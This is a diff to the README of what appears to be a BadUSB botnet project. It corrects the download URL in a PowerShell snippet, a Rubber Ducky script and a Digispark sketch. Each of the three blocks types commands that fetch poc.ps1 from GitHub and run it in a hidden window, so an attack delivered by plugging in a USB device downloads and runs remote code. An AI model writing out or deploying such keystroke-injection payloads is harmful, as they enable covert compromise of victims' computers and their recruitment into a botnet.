@@ -20,7 +20,7 @@ $githubScript = '<you_fork/poc.ps1>'
 
 ```powershell
 > [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-> (new-object net.webclient).DownloadFile('https://github.com/alexfrancow/badusb_botnet/blob/master/poc.ps1','poc.ps1')
+> (new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1','poc.ps1')
 > powershell.exe -windowstyle hidden -file poc.ps1
 ```
 
@@ -35,7 +35,7 @@ DELAY 750
 STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 DELAY 500
 ENTER
-STRING (new-object net.webclient).DownloadFile('https://github.com/alexfrancow/badusb_botnet/blob/master/poc.ps1','poc.ps1')
+STRING (new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1','poc.ps1')
 DELAY 500
 ENTER
 STRING powershell.exe -windowstyle hidden -file poc.ps1
@@ -63,7 +63,7 @@ DigiKeyboard.delay(750);
 DigiKeyboard.print("[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(500);
-DigiKeyboard.print("(new-object net.webclient).DownloadFile('https://github.com/alexfrancow/badusb_botnet/blob/master/poc.ps1','poc.ps1')");
+DigiKeyboard.print("(new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1','poc.ps1')");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(500);
 DigiKeyboard.print("powershell.exe -windowstyle hidden -file poc.ps1");
